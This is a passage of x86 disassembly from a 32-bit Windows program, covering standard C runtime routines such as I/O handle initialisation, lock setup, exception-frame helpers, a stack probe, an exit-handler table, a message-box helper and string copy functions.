  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
